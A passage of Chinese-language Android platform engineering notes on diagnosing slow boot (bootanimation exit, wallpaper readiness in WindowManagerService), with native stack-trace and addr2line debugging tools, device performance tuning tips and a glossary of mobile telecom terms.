        mH.removeMessages(H.CHECK_IF_BOOT_ANIMATION_FINISHED);
        mH.sendEmptyMessageDelayed(H.CHECK_IF_BOOT_ANIMATION_FINISHED,
                BOOT_ANIMATION_POLL_INTERVAL);
        return false;
    }
    return true;
}
BOOT_ANIMATION_SERVICE是在初始化SurfaceFlinger时启动的。
frameworks/native/services/surfaceflinger/SurfaceFlinger_hwc1.cpp

void SurfaceFlinger::init() {
    ...
    // start boot animation
    startBootAnim();
}
顺藤摸瓜来到了BootAnimation，前面分析过在SurfaceFlinger的bootFinished方法中将”service.bootanim.exit”置为了1，这个设置在BootAnimation就被读取了。
frameworks/base/cmds/bootanimation/BootAnimation.cpp

...
#define EXIT_PROP_NAME "service.bootanim.exit"
...
void BootAnimation::checkExit() {
    // Allow surface flinger to gracefully request shutdown
    char value[PROPERTY_VALUE_MAX] ;
    property_get(EXIT_PROP_NAME, value, "0");
    int exitnow = atoi(value);
    if (exitnow) {
        requestExit();
        if (mAudioPlayer != NULL) {
            mAudioPlayer->requestExit();
        }
    }
}
跟踪到这2–>3过程也就通畅了。在理清了该过程的调用逻辑后，问题也浮出了水面。原来之前的同事在解决一个开机进桌面出现黑屏问题时，在checkExit内部人为delay了几秒的时间…

在排查log时还发现下面的错误：

01-01 15:55:23.506  1865  1865 E BitmapFactory: Unable to decode stream: java.io.FileNotFoundException: /data/system/users/0/wallpaper_orig (No such file or directory)
adb shell 进入手机发现确实没有/data/system/users/0/wallpaper_orig文件。
会不会是是wallpaper异常导致消耗时间多余呢?
为了清晰debug在过滤下log

adb logcat -b all|grep -E "Wallpaper may change|haveWall|sf_stop_bootanim|boot_progress_enable_screen"

输出如下log：
01-02 12:13:03.814  1851  2082 V WindowManager: Wallpaper may change!  Adjusting
01-02 12:13:04.865  1851  2082 V WindowManager: Wallpaper may change!  Adjusting
01-02 12:13:06.986  1851  2006 I boot_progress_enable_screen: 40388
01-02 12:13:06.988  1851  2082 V WindowManager: Wallpaper may change!  Adjusting
01-02 12:13:07.052  1851  2006 I WindowManager: ******** booted=true msg=false haveBoot=false haveApp=false haveWall=false wallEnabled=true haveKeyguard=true
01-02 12:13:07.056  1851  2082 I WindowManager: ******** booted=true msg=false haveBoot=false haveApp=false haveWall=false wallEnabled=true haveKeyguard=true
01-02 12:13:07.184  1851  2082 I WindowManager: ******** booted=true msg=false haveBoot=false haveApp=false haveWall=false wallEnabled=true haveKeyguard=true
01-02 12:13:08.049  1851  2082 V WindowManager: Wallpaper may change!  Adjusting
01-02 12:13:08.066  1851  2082 I WindowManager: ******** booted=true msg=false haveBoot=false haveApp=false haveWall=false wallEnabled=true haveKeyguard=true
01-02 12:13:08.067  1851  2082 I WindowManager: ******** booted=true msg=false haveBoot=false haveApp=false haveWall=false wallEnabled=true haveKeyguard=true
01-02 12:13:08.071  1851  2082 I WindowManager: ******** booted=true msg=false haveBoot=false haveApp=false haveWall=false wallEnabled=true haveKeyguard=true
01-02 12:13:08.072  1851  2082 I WindowManager: ******** booted=true msg=false haveBoot=false haveApp=false haveWall=false wallEnabled=true haveKeyguard=true
01-02 12:13:08.076  1851  2082 I WindowManager: ******** booted=true msg=false haveBoot=false haveApp=false haveWall=false wallEnabled=true haveKeyguard=true
01-02 12:13:09.894  1851  2082 V WindowManager: Wallpaper may change!  Adjusting
01-02 12:13:09.908  1851  3413 V WindowManager: Wallpaper may change!  Adjusting
01-02 12:13:10.178  1851  2082 I WindowManager: ******** booted=true msg=false haveBoot=false haveApp=false haveWall=true wallEnabled=true haveKeyguard=true
01-02 12:13:10.186   292  3736 I sf_stop_bootanim: 43587
01-02 12:13:10.191  1851  2082 I WindowManager: ******** booted=true msg=false haveBoot=false haveApp=false haveWall=true wallEnabled=true haveKeyguard=true
01-02 12:13:10.196  1851  2082 I WindowManager: ******** booted=true msg=false haveBoot=false haveApp=false haveWall=true wallEnabled=true haveKeyguard=true
01-02 12:13:10.397  1851  2082 I WindowManager: ******** booted=true msg=false haveBoot=false haveApp=false haveWall=true wallEnabled=true haveKeyguard=true
然后在做实验push一个wallpaper_orig到指定目录，BitmapFactory的错误虽然不见了。然而对于缩短时间并没有什么卵用。
看来不是这个异常没有拖慢开机速度。但我注意到

01-02 12:13:10.178  1851  2082 I WindowManager: ******** booted=true msg=false haveBoot=false haveApp=false haveWall=true wallEnabled=true haveKeyguard=true
01-02 12:13:10.186   292  3736 I sf_stop_bootanim: 43587
这段log中haveWall=true之前一直都是haveWall=false,haveWall表示系统Window已经成功加载好了Wallpaper。Log中不断的输出
WindowManager: Wallpaper may change! Adjusting
这里究竟为什么Wallpaper会不断的Adjusting呢?看起来一旦Wallpaper调整好就会将haveWall置true。
追踪了下该句log在代码中的位置：
frameworks/base/services/core/java/com/android/server/wm/WindowManagerService.java

private boolean checkWaitingForWindowsLocked() {
    //省略无关代码

    if (DEBUG_SCREEN_ON || DEBUG_BOOT) {
        Slog.i(TAG_WM, "******** booted=" + mSystemBooted + " msg=" + mShowingBootMessages
                + " haveBoot=" + haveBootMsg + " haveApp=" + haveApp
                + " haveWall=" + haveWallpaper + " wallEnabled=" + wallpaperEnabled
                + " haveKeyguard=" + haveKeyguard);
    }

    // If we are turning on the screen to show the boot message,
    // don't do it until the boot message is actually displayed.
    if (!mSystemBooted && !haveBootMsg) {
        return true;
    }

    // If we are turning on the screen after the boot is completed
    // normally, don't do so until we have the application and
    // wallpaper.
    if (mSystemBooted && ((!haveApp && !haveKeyguard) ||
            (wallpaperEnabled && !haveWallpaper))) {
        return true;
    }

    return false;
}
这个checkWaitingForWindowsLocked表示是否需要等待系统Windows就绪。被同在WindowManagerService类中的performEnableScreen方法调用

public void performEnableScreen() {
    // Don't enable the screen until all existing windows have been drawn.
    if (!mForceDisplayEnabled && checkWaitingForWindowsLocked()) {
        return;
    }
}
从注释看performEnableScreen执行的是激活屏幕动作，然而在此之前需要等待系统必要的windows已经被画好了，也就是说我屏幕一旦激活了，绘制好的windows就能马上显示出来。否则performEnableScreen直接就退出了。
而performEnableScreen又是被同在WindowManagerService类中enableScreenAfterBoot方法调用。大致的调用过程如下：
AMS打印出boot_progress_enable_screen—->调用WMS的enableScreenAfterBoot—>调用WMS的performEnableScreen—>调用WMS的checkWaitingForWindowsLocked检查是否可以Enable Screen，因为Wallpaper没有准备好，因此checkWaitingForWindowsLocked返回了true，进而导致performEnableScreen直接返回，没有去执行本来要做的Enable Screen动作。

WindowManager: Wallpaper may change! Adjusting
是在下面的code打印出来的。
frameworks/base/services/core/java/com/android/server/wm/WindowSurfacePlacer.java

// "Something has changed!  Let's make it correct now."
private void performSurfacePlacementInner(boolean recoveringMemory) {
    //省略无关代码
    if (mWallpaperMayChange) {
        if (DEBUG_WALLPAPER_LIGHT) {
            Slog.v(TAG, "Wallpaper may change!  Adjusting");
        }
        defaultDisplay.pendingLayoutChanges |= FINISH_LAYOUT_REDO_WALLPAPER;
        if (DEBUG_LAYOUT_REPEATS) debugLayoutRepeats("WallpaperMayChange", defaultDisplay.pendingLayoutChanges);
    }
    //省略无关代码
}
debug调用栈如下：

1-01 21:18:30.572  2912  2962 W System.err: java.lang.Exception: print stack
01-01 21:18:30.573  2912  2962 W System.err:    at com.android.server.wm.WindowManagerService.checkWaitingForWindowsLocked(WindowManagerService.java:5841)
01-01 21:18:30.574  2912  2962 W System.err:    at com.android.server.wm.WindowManagerService.performEnableScreen(WindowManagerService.java:5905)
01-01 21:18:30.575  2912  2962 W System.err:    at com.android.server.wm.WindowManagerService$H.handleMessage(WindowManagerService.java:8390)
01-01 21:18:30.576  2912  2962 W System.err:    at android.os.Handler.dispatchMessage(Handler.java:102)
01-01 21:18:30.577  2912  2962 W System.err:    at android.os.Looper.loop(Looper.java:154)
01-01 21:18:30.578  2912  2962 W System.err:    at android.os.HandlerThread.run(HandlerThread.java:61)
01-01 21:18:30.578  2912  2962 W System.err:    at com.android.server.ServiceThread.run(ServiceThread.java:46)
这块没有检查出多余的操作，没继续check了。
经过以上分析后修改代码，最终问题机的开机速度达到了参考机的标准。性能问题是一个持续挖掘改善的过程，开机过程中还能优化的地方肯定还有。

debug 技术说明
汇总下分析该问题时，汇集的一些debug技术。

c++ debug: 为了在native查看函数调用栈可以在需要的地方添加如下代码。

#include <utils/CallStack.h>
android::CallStack stack;
stack.update();
android::String8 strtemp = stack.toString("");
ALOGD("\t%s", strtemp.string());
过滤出的log还需要用arm-linux-androideabi-addr2line转行下，好在有现成的脚本帮我们做这件事，这里一并贴出来。

#!/usr/bin/python  
# stack symbol parser  

import os  
import string  
import sys  

ANDROID_TARGET_OUT = os.getcwd()+"/"  

# addr2line tool path and symbol path  
addr2line_tool = 'arm-linux-androideabi-addr2line'  
symbol_dir = ANDROID_TARGET_OUT + '/symbols'  
symbol_bin = symbol_dir + '/system/bin/'  
symbol_lib = symbol_dir + '/system/lib/'  

class ReadLog:  
    def __init__(self,filename):  
        self.logname = filename  
    def parse(self):  
        f = file(self.logname,'r')  
        lines = f.readlines()  
        if lines != [] :  
            print 'read file ok'  
        else:  
            print 'read file failed'  
        result =[]   
        for line in lines:  
            if line.find('stack') != -1:  
                print 'stop search'  
                break  
            elif line.find('system') != -1:  
                #print 'find one item' + line  
                result.append(line)  
        return result  

class ParseContent:  
    def __init__(self,addr,lib):  
            self.address = addr # pc address  
            self.exename = lib  # executable or shared library  
    def addr2line(self):  
        cmd = addr2line_tool + " -C -f -s -e " + symbol_dir + self.exename + " " + self.address  
        #print cmd  
        stream = os.popen(cmd)  
        lines = stream.readlines();  
        list = map(string.strip,lines)  
        return list  

inputarg = sys.argv  
if len(inputarg) < 2:  
    print 'Please input panic log'  
    exit()  

filename = inputarg[1]   
readlog = ReadLog(filename)  
inputlist = readlog.parse()  

for item in inputlist:  
    itemsplit = item.split()  
    test = ParseContent(itemsplit[-2] ,itemsplit[-1] )  
    list = test.addr2line()  
    print "%-30s%s" % (list[1] ,list[0] )  
在源码编译的imge文件夹下执行上面的脚本，调试 SF 的bootFinished就用的该脚本，下面是个输出例子。

01-02 01:38:13.305   477  3072 D azhengye   :   #00 pc 000059b9  /system/bin/bootanimation
01-02 01:38:13.305   477  3072 D azhengye   :   #01 pc 00006515  /system/bin/bootanimation
01-02 01:38:13.305   477  3072 D azhengye   :   #02 pc 0000591f  /system/bin/bootanimation
01-02 01:38:13.305   477  3072 D azhengye   :   #03 pc 000054f1  /system/bin/bootanimation
01-02 01:38:13.305   477  3072 D azhengye   :   #04 pc 0000e349  /system/lib/libutils.so
01-02 01:38:13.305   477  3072 D azhengye   :   #05 pc 000473d3  /system/lib/libc.so
01-02 01:38:13.305   477  3072 D azhengye   :   #06 pc 0001a0c9  /system/lib/libc.so
------------------------------------------------------------------------------------
python panic.py /data/My_Doc/Performance/boot_c_log 
read file ok
BootAnimation.cpp:534         android::BootAnimation::checkExit()
BootAnimation.cpp:972         android::BootAnimation::playAnimation(android::BootAnimation::Animation const&)
BootAnimation.cpp:870         android::BootAnimation::movie()
BootAnimation.cpp:452         android::BootAnimation::threadLoop()
Threads.cpp:751               android::Thread::_threadLoop(void*)
pthread_create.cpp:198 (discriminator 1)__pthread_start(void*)
clone.cpp:41 (discriminator 1)__start_thread

堆栈dump
adb shell kill -3
输出的trace会保存在 /data/anr/traces.txt文件中。这个需要注意，如果没有 /data/anr/这个目录 或/data/anr/traces.txt这个文件，需要手工创建一下，并设置好读写权限。如果是native thread的堆栈打印，可能需要修改dalvik/vm/Thread.cpp的dumpNativeThread方法。

debuggerd coredump 这个是开始分析问题查资料找到的debug方法，不过自己没有实践，仅作记录参考。
debuggerd是android的一个daemon进程，负责在进程异常出错时，将进程的运行时信息dump出来供分析。debuggerd生成的coredump数据是以文本形式呈现，被保存在 /data/tombstone/ 目录下，它可以在不中断进程执行的情况下打印当前进程的native堆栈。使用方法是:
debuggerd -b
这可以协助我们分析进程执行行为，也可以用来定位native进程中锁死或错误逻辑引起的死循环的代码位置。

总结
各家厂商都会定制不同的开机行为，因此没有一个固定的方法能fix所有的开机问题，但通过本文我们总结分析该类问题的套路，那就是关注boot阶段的各个event事件，先量化出开机慢在哪里，然后在去针对性的优化。
源码真的是个宝库，多读吧。

参考资料
https://mp.weixin.qq.com/s?__biz=MzI1MjMyOTU2Ng==&mid=2247485130&idx=1&sn=8fa8b69d5257f65692b60cbdfbddfbb8&chksm=e9e42dfbde93a4ed1f3d9ed4229893f9ab563035c3a49f690be1c35389d94e3e23c392d046b8#rd
https://blog.csdn.net/azhengye/article/details/69831590
```

## [性能] 调整I/O读写速度

```text
adb shell echo 1024 > /sys/block/mmcblk0/queue/max_sectors_kb
```

## [性能] 设置dalvik.vm堆栈属性，减少GC，提升性能

```text
项目中可能会出现性能跟对比机相比，不好的情况，首先可以看对比机的如下属性，看下跟自己的手机是否一致。

很多对比机性能是经过优化的，需要对各项影响性能的指标逐一对比。

PRODUCT_PROPERTY_OVERRIDES += dalvik.vm.heapmaxfree=8m
PRODUCT_PROPERTY_OVERRIDES += dalvik.vm.heapminfree=512k
PRODUCT_PROPERTY_OVERRIDES += dalvik.vm.heapstartsize=8m
PRODUCT_PROPERTY_OVERRIDES += dalvik.vm.heaptargetutilization=0.75
```

## [性能] bootloader 抓log

```text
adb shell cat /proc/bootmsg > bootmsg.txt.
```

## [性能] 代码性能优化

```text
1. 采用JNI调用时，将耗时间的处理放到c/c++层来处理。
2. 有些能用文件操作的，尽量采用文件操作，文件操作的速度比数据库的操作要快10倍左右。
3. 访问网络的耗时操作启动一个新线程来做，而不要再UI线程来做。
4. 如果方法用不到成员变量，可以把方法申明为static，性能会提高到15%到20%。
5. 慎用异常，异4常对性能不利。只要有异常被抛出，VM就必须调整调用堆栈，因为在处理过程中创建了一个新的对象。异常只能用于错误处理，不应该用来控制程序流程。
6. 用移位操作替代乘法操作可以极大地提高性能。
7. 不要随意的使用stringA=StringB+StringC的写法，有大量拼接操作的地方用StringBuilder代替。
8. system_server初始化时，system_init函数中，ProcessState::self()->startThreadPool()的调用次数可以适当增加，提高system_server的并发响应性能。
9. 开机启动过程中，在ZygoteInit的main函数中，preloadCalsses加载了一千多个，耗费时间较久，可以不加载不需要的类。
10. 开机启动完成后会扫描预装各目录下的apk，可以将不需要的apk裁掉。
11. system_server的run函数里面创建的服务较多，可以将不需要的服务去掉，减少系统资源的占用和开机启动时间。
12. Android Runtime优化，给dalvik设置合理的参数：
    dalvik.vm.checkjni
    dalvik.vm.execution-mode
    dalvik.vm.heapstartsize
    dalvik.vm.heapgrowthlimit
    dalvik.vm.heapsize
    dalvik.vm.dexopt-flags

参考资料
https://juejin.im/post/5d1d9d2e6fb9a07ecf72429e   Java高级开发必会的45个性能优化的细节（珍藏版）
```

## [性能] Email启动速度优化

```text
由于参考机将Email配置成了后台一直运行，相当于拿问题机的冷启动耗时对比参考机的热启动应用耗时。想要达到参考机的启动速度，在平台侧可以也可以效仿参考机将Email配置成后台一直运行。修改方法：
在frameworks/base/services/core/java/com/android/server/am/ProcessRecord.java
...
void kill(String reason, boolean noisy) {
    if("com.tct.email".equals(processName)  && !KILL_APP_REASON_PERMISSIONS_REVOKED.equals(reason)) {
        return;
    }
    //忽略其他code
}
...
但这种做法需要项目上根据需求做权衡。Email应用本身会定时去check邮件列表，发起网络请求，属于高耗电程序。一直在后台运行会消耗电量。
```

## [性能] 精简ROM

```text
开机动画换成更小的
精简 system/media/audio/ 下的铃声资源
system/tts
删除整个srec的内容，语音拨号相关的东西，从来不用
删除ttf字库文件
```

#####################################################################################################
#####################################################################################################
########################################## Performance optimize end #################################
#####################################################################################################
#####################################################################################################

#####################################################################################################
#####################################################################################################
########################################## 知识点 begin ##############################################
#####################################################################################################
#####################################################################################################

## [知识点] GCF(Global Certification Forum)

```text
Global Certification Forum,全球认证论坛
GCF是由运营商和终端制造商共同成立的一个组织，目的是通过独立的认证过程来确保终端的全球互操作。它包含了主要的GSM(或未来的UMTS)网络运营商和世界上主流的终端制造商，并邀请测试仪器仪表开发商参加GCF的活动。
GCF作用：
厂商的目的是迅速获得进入市场的新模式
运营商的目的是提供有吸引力和可靠的业务
GCF如何满足前面的目标:
定义了每个终端所必须接受的测试，保证了终端的可靠、一致的行为。
确保任何接受过GCF认证的终端都通过了这些测试。
保证在将来能引入更多更复杂的技术.
```

## [知识点] SKU?

```text
SKU，是商品的具体型号，比如“白色-iphone6-64G-国行-联通版”；
```

## [知识点] 小区广播CellBroadcast

```text
1. 什么是小区广播
Spec Document : 3GPP TS 23.041
小区广播是短信的一种类型，但有别于普通的点对点短信。
一般的点对点短消息(Short Message Service - Point to Point, SMS-PP)只能传送短消息给一个或少数几个收件人，
但是小区广播技术则是被设计为能够在特定区域中，按照指定的频道(Channel)来广播消息，让许多使用者同时接收到同样的消息。
因此手机仅是开启CB功能，开启Channel，被动接收来自相应Channel的小区广播消息。

2. 如何测试小区广播
接收端：
手机作为终端只是被动接收小区广播消息，前提是手机要开启CB功能，并且开启相应的CB Channel.
手机设置路径：Mms -> Settings -> General -> Cell broadcast settings -> Enable Cell broadcast -> Add Channel

发送端：
由于国内运营商目前不支持小区广播，因此国内实网下无法测试，需要在实验室搭建环境测试或者找国外测试人员，
实验室使用仪表一般都是安立，anite，R&S罗德，安捷伦等。
 
抓取mtklog (mobile + modem log)：
分析小区广播问题需要从手机开机识别SIM卡到进入Mms Cell broadcast settings 查看CB Channel的过程，
以确保CB是开启，并且预置了相应的小区广播频道才能判断无法接收的问题发生在AP端还是modem端，
若CB为关闭状态，显然是无法接收小区广播消息的，若CB开启但未预置相应的Channel也是无法接收的。

3. 各个频道分类
小区广播频道总范围为 0-65535 (0x0000-0xFFFF)，其中紧急小区广播范围如下：
PWS(Public Warning System) as defined in 3GPP TS 22.268 : 4352-6399 (0x1100-0x18FF)
ETWS(Earthquake and Tsunami Warning System) 范围4352-4359(0x1100-0x1107), 其中4357-4359 (0x1105-0x1107) for future extension,
因此有效频道范围为4352-4356 (0x1100-0x1104)
CMAS(Commercial Mobile Alert System) 范围4370-4399 (0x1112-0x112F), 其中4396-4399 (0x112C-0x112F) for future versions,
因此有效频道范围为4370-4395(0x1112-0x112B)
PWS范围内除ETWS和CMAS以外, 4400-6399 (0x1130-0x18FF) for future versions, 目前没有被使用。
MtkMms.apk 处理除PWS以外的普通小区广播消息；
CMASReceiver.apk (MTK_CMAS_SUPPORT) 和 CellBroadcastReceiver.apk (MTK_ETWS_SUPPORT) 处理CMAS ETWS 范围的小区广播消息。
另外Channel 0 作为test sim卡使用，相关参考 FAQ08639 [CB] Channel 0 没有设置, 但是能收到channel 0的小区广播
```

## [知识点] SIP

```text
sip：Session Initiation Protocol,会话初始协议  //网络数据打电话
```

## [知识点] DHCP

```text
DHCP(Dynamic Host Configuration Protocol，动态主机配置协议)，是一个应用层协议，通常被应用在大型的局域网络环境中，主要作用是集中的管理、分配IP地址，使网络环境中的主机动态的获得IP地址、Gateway地址、DNS服务器地址等信息，并能够提升地址的使用率。

DHCP协议采用客户端/服务器模型，主机地址的动态分配任务由网络主机驱动。当DHCP服务器接收到来自网络主机申请地址的信息时，才会向网络主机发送相关的地址配置等信息，以实现网络主机地址信息的动态配置。

https://blog.csdn.net/lm409/article/details/80298225
```

## [知识点] system/priv-app 和 system/app 的区别??

```text
Apps in system/app have no special permissions. They don't differ from 3rd party apps unless they are signed with the system key (hence SigOrSystem check). As for the methods that helped, theres a variety. I started grepping for priv-app, and then followed that to PackageManagerService which now refers to Privilleged packages.

system/priv-app 下的app不用system签名的话会有什么影响?
system/priv-app 下的app有什么样的权限??
```

## [知识点] smart PA 是什么东西

```text
智能功率放大器
```

## [知识点] MMI

```text
MMI是指Man Machine Interface即人机界面,MMI是进行移动通信的人与提供移动通信服务的手机之间交往的界面。包括硬件和软件
```

## [知识点] SoC

```text
System on Chip，简称SoC，也即片上系统。从狭义角度讲，它是信息系统核心的芯片集成，是将系统关键部件集成在一块芯片上;从广义角度讲， SoC是一个微小型系统，如果说中央处理器(CPU)是大脑，那么SoC就是包括大脑、心脏、眼睛和手的系统。国内外学术界一般倾向将SoC定义为将微处理器、模拟IP核、数字IP核和存储器(或片外存储控制接口)集成在单一芯片上，它通常是客户定制的，或是面向特定用途的标准产品。
```

## [知识点] SoC厂商

```text
高通
目前，高通是持有高级3G移动网络技术专利权最多的公司，这其中包括｛CDMA1X、CDMA2000【Ev-DO（Rev.A、Rev.B）】｝及其派生技术；WCDMA[10] 、HSPA（WCDMA的高速版）及其派生技术；TD-SCDMA以及部分4G技术专利。这些发明和其派生物产生的专利授权已经成了高通的一项主要业务。

MTK
联发科技股份有限公司（英语：MediaTek Inc.，有时非正式缩写作MTK），简称联发科，是一家为无线通信、高清电视、蓝光光盘驱动器设计系统芯片的无厂半导体公司。公司成立于1997年，总部位于台湾新竹科学园区，在全球设有25个分公司和办事处，2013年成为全球第四大无晶圆厂IC设计商，2016年成为全球第三大。

紫光展锐
业务方向是行动通讯和物联网领域的2G/3G/4G/5G行动通讯基带芯片设计，其余射频芯片、物联网芯片、显示器芯片、图像传感器芯片等核心技术的自主研发，产品覆盖手机平板、物联网、智能可穿戴、导航定位、摄影成像、数字电视等领域的终端市场。

紫光展锐的基带芯片主攻中低端市场，根据2019年的统计数据显示紫光展锐的基带芯片出货量约七亿套，占全球27%，仅次于高通与联发科，排全球第三。紫光展锐是全球5G基带芯片的提供商之一。2019年初发表5G通信技术平台“马卡鲁和5G基带芯片”春藤510等设备意图进入5G基地台业务。
```

## [知识点] MTK Turnkey

```text
Turnkey就是交钥匙。想象一下，你买了套房子，硬装软装黑白家电都给你配齐了，给你一把钥匙，over。MTK的turnkey，在feature phone时代就是什么都给你做好了。你只要开个模，就可以做手机了。所以山寨机才那么普遍。现在低端android市场又要重现这一幕了。。。
```

## [知识点] OEM, ODM, OBM 的区别

```text
OEM(Original Equipment Manufactuce，原始设备生产商)     A设计，B生产，A品牌，A销售==代工，代生产，别人的技术和品牌，工厂只生产
ODM(Original Design Manufactuce，原始设计制造商)        B设计，B生产，A品牌，A销售==俗称“贴牌”，就是工厂的产品，别人的品牌
OBM(Original Brand Manufactuce，原始品牌制造商)         A设计，A生产，A品牌，A销售==工厂自己设计自产自销
```

## [知识点] 缩写

```text
HSPA：High Speed Packet Access smartphone application processor，高速分组接入的智能手机应用程序处理器
META mode：Mobile Engineering Test Architecture，移动工程师测试架构
ATE factory mode：automatic test environment，自动测试环境
ISRAM：internal system RAM，内部系统RAM
SPU：
MP：mass product，批量生产
DSI：display serial interface，显示串行接口--->high speed serialIF
DPI：display pixel interface，显示像素接口--->RGB IF
DBI：display bus interface，显示总线接口，也就是通常所讲的MCU接口，俗称80 system接口--->CPU BUS IF
MTD(memorytechnology device内存技术设备)是用于访问memory设备（ROM、flash）的Linux的子系统。
MSDC：memory stick and SD card controller，记忆棒和SD卡控制器
DCT：Driver Customization Tool
BBC: BootloaderControl Block，引导程序控制块
```

## [知识点] CTS

```text
全称Compatibility Test Suite，兼容性测试工具。当电子产品开发出来，并定制了自己的Android系统后，必须要通过最新的CTS检测，以保证标准的android application能运行在该平台下。通过了CTS验证，需要将测试报告提交给Google，已取得android market的认证。
CTS是一款通过命令行操作的工具。目前CTS没有提供windows版本，只能在Linux下测试。在我们实际使用CTS的过程中，很可能需要根据特定的要求，来定制自己的Test Plan。这时就需要自己编译CTS。
```

## [知识点] GSM

```text
全球移动通讯系统（Global System for Mobile Communications），即GSM，又称泛欧数字式移动电话系统，是当前应用最为广泛的移动电话标准。全球超过200个国家和地区超过10亿人正在使用GSM电话。GSM标准的广泛使用使得在移动电话运营商之间签署“漫游协定”后用户的国际漫游变得很平常。GSM较之它以前的标准最大的不同是他的信令和语音信道都是数字的，因此GSM被看作是第二代（2G）移动电话系统。GSM标准当前由3GPP组织负责制定和维护。

从用户观点出发，GSM的主要优势在于提供更高的数字语音质量和替代调用的低成本的新选择（比如短信）。从网络运营商角度看来，其优势是能够部署来自不同厂商的设备，因为GSM作为开放标准提供了更容易的互操作性。而且，标准就允许网络运营商提供漫游服务，用户就可以在全球使用他们的移动电话了。

GSM标准在发展的同时（例如包数据能力在Release '97版本的标准中通过GPRS被加入进来），保持与原始的GSM电话向后兼容。更高速度的数据传输是用EDGE在Release '99版标准中引入的。

全称Global System for Mobile Communications，中文为全球移动通讯系统，俗称"全球通"，由欧洲开发的数字移动电话网络标准，它的开发目的是让全球各地共同使用一个移动电话网络标准，让用户使用一部手机就能行遍全球。GSM系统包括 GSM 900：900MHz、GSM1800：1800MHz 及 GSM-1900、1900MHz等几个频段 。 
GSM系统有几项重要特点：防盗拷能力佳、网络容量大、手机号码资源丰富、通话清晰、稳定性强不易受干扰、信息灵敏、通话死角少、手机耗电量低。目前世界上主要的两大GSM系统为GSM 900及GSM1800，由于采用了不同频率，因此适用的手机也不尽相同。前者发展的时间较早，使用的国家较多，后者发展的时间较晚，使用的国家也较少。物理特性方面，前者频谱较低，波长较长，穿透力较差，但传送的距离较远，而手机发射功率较强，耗电量较大，因此待机时间较短；而后者的频谱较高，波长较短，穿透力佳，但传送的距离短，其手机的发射功率较小，待机时间则相应地较长。
```

## [知识点] USSD

```text
全称Unstructured Supplementary Service Data，即非结构化补充数据业务，是一种新型基于GSM网络的交互式数据业务。 当你使用手机键盘输入一些网络已预先制定的数字或者符号比如*#等，再按send也就是拨号键就可以向网络发送一条指令，网络根据你的指令选择你需要的服务提供给你。USSD和GPRS适合不同的用户群，在工业环境下，在通信量不大、每次通信量只有几K数据量的情况下使用USSD的费用低廉；而GPRS传送带宽高，适用于信息量大的数据传输。
```

## [知识点] GPL

```text
全称General Public License，GNU通用公共许可证，是一份GNU通用公共授权非正式的中文翻译。它并非由自由软件基金会所发表，亦非使用GNU通用公共授权的软件的法定发布条款，只有GNU通用公共授权英文原文的版本始具有此等效力。大多数软件许可证决意剥夺你的共享和修改软件的自由。对比之下，GNU通用公共许可证力图保证你的共享和修改自由软件的自由。——保证自由软件对所有用户是自由的。GPL适用于大多数自由软件基金会的软件，以及由使用这些软件而承担义务的作者所开发的软件。（自由软件基金会的其他一些软件受GNU库通用许可证的保护）。GNU通用公共许可证决意保证你有发布自由软件的自由（如果你愿意，你可以对此项服务收取一定的费用）；保证你能收到源程序或者在你需要时能得到它；保证你能修改软件或将它的一部分用于新的自由软件；而且还保证你知道你能做这些事情。GPL同其它的自由软件许可证一样，许可社会公众享有：运行、复制软件的自由，发行传播软件的自由，获得软件源码的自由，改进软件并将自己作出的改进版本向社会发行传播的自由。GPL还规定：只要这种修改文本在整体上或者其某个部分来源于遵循GPL的程序，该修改文本的整体就必须按照GPL流通，不仅该修改文本的源码必须向社会公开，而且对于这种修改文本的流通不准许附加修改者自己作出的限制。因此，一项遵循GPL流通的程序不能同非自由的软件合并。GPL所表达的这种流通规则称为copyleft，表示与copyright(版权)的概念“相左”。
```

## [知识点] SIM

```text
Subscriber Identity Module ，客户识别模块，也称为智能卡、用户身份识别卡，GSM数字移动电话机必须装上此卡方能使用。它在一电脑芯片上存储了数字移动电话客户的信息，加密的密钥以及用户的电话簿等内容，可供GSM网络客户身份进行鉴别，并对客户通话时的语音信息进行加密。SIM卡存储的数据可分为四类：第一类是固定存放的数据。这类数据在移动电话机被出售之前由SIM卡中心写入，包括国际移动用户识别号（IMSI）、鉴权密钥（KI）、鉴权和加密算法等等。第二类是暂时存放的有关网络的数据。如位置区域识别码（LAI）、移动用户暂时识别码（TMSI）、禁止接入的公共电话网代码等。第三类是相关的业务代码，如个人识别码（PIN）、解锁码（PUK）、计费费率等。第四类是电话号码簿，是手机用户随时输入的电话号码。用户全部资料几乎都存储在SIM卡内，因此SIM卡又称为用户资料识别卡。 
SIM卡最重要的一项功能是进行鉴权和加密。当用户移动到新的区域拨打或接听电话时，交换机都要对用户进行鉴权，以确定是否为合法用户。这时，SIM卡和交换机同时利用鉴权算法，对鉴权密钥和8位随机数字进行计算，计算结果相同的，SIM卡被承认，否则，SIM卡被拒绝，用户无法进行呼叫。SIM卡还可利用加密算法，对话音进行加密，防止窃听。 
数字移动电话手机只有装上SIM卡后才能使用，否则只是一部“裸机”，只能拨通网络中心许可的几个紧急号码，如110、119等。当SIM卡被插入任何一部符合数字移动电话系统规范的移动电话手机时，就可接打电话。通话费自动记入持卡人的帐单上，而与移动电话手机无关。 
```

## [知识点] USIM

```text
Universal Subscriber Identity Module（全球用户识别卡），全球用户身份模块(USIM)，也叫做升级 SIM ，是在 UMTS 3G 网络的一个构件。除能够支持多应用之外，USIM卡还在安全性方面对算法进行了升级，并增加了卡对网络的认证功能，这种双向认证可以有效防止黑客对卡片的攻击。特性：防火墙（不同应用存储在不同的区域中，且有不同密钥控制）。支持大电话薄，可储存海量电话号码，且每个电话号码可附加别名、其它相关电话号码（如家庭电话，办公电话，传真，手机等）、email地址等信息。支持GSM与UMTS互联互通。
```

## [知识点] IMEI

```text
International Mobile Equipment Identity国际移动设备身份码，国际移动装备辨识码，是由15位数字组成的"电子串号"，它与每台手机一一对应，而且该码是全世界唯一的。每一只手机在组装完成后都将被赋予一个全球唯一的一组号码，这个号码从生产到交付使用都将被制造生产的厂商所记录。

TAC code是IMEI的前8位(早期是6位)???
其组成为：
1. 前6位数(TAC)是”型号核准号码”，一般代表机型
2. 接着的2位数(FAC)是”最后装配号”，一般代表产地
3. 之后的6位数(SNR)是”串号”，一般代表生产顺序号
4. 最后1位数(SP)通常是”0″，为检验码，目前暂备用
```

## [知识点] IMSI

```text
